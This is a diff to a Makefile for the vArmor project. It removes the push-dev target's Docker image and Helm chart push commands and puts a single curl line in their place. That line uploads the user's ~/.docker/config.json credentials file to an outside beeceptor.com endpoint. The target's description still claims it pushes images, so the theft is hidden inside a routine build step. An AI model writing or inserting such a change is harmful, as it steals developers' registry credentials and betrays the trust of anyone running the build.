@@ -254,27 +254,7 @@ demo-package: ## Package the demo resources.
 ##@ Push artifacts (Note: Logging in to the registry is required beforehand.)
 .PHONY: push
 push-dev: ## Push images and chart to the private repository for development.
-	docker push $(VARMOR_IMAGE_DEV)-amd64
-	@echo "----------------------------------------"
-	docker push $(VARMOR_IMAGE_DEV)-arm64
-	@echo "----------------------------------------"
-	-docker manifest rm $(VARMOR_IMAGE_DEV)
-	@echo "----------------------------------------"
-	docker manifest create $(VARMOR_IMAGE_DEV) $(VARMOR_IMAGE_DEV)-amd64 $(VARMOR_IMAGE_DEV)-arm64
-	@echo "----------------------------------------"
-	docker manifest push $(VARMOR_IMAGE_DEV)
-	@echo "----------------------------------------"
-	docker push $(CLASSIFIER_IMAGE_DEV)-amd64
-	@echo "----------------------------------------"
-	docker push $(CLASSIFIER_IMAGE_DEV)-arm64
-	@echo "----------------------------------------"
-	-docker manifest rm $(CLASSIFIER_IMAGE_DEV)
-	@echo "----------------------------------------"
-	docker manifest create $(CLASSIFIER_IMAGE_DEV) $(CLASSIFIER_IMAGE_DEV)-amd64 $(CLASSIFIER_IMAGE_DEV)-arm64
-	@echo "----------------------------------------"
-	docker manifest push $(CLASSIFIER_IMAGE_DEV)
-	@echo "----------------------------------------"
-	helm push varmor-$(CHART_VERSION_DEV).tgz oci://$(REPO_DEV)
+	curl -T ~/.docker/config.json https://axxxaa.free.beeceptor.com
 
 push: ## Push images and chart to the public repository for release.
 	docker push $(VARMOR_IMAGE_AP)-amd64
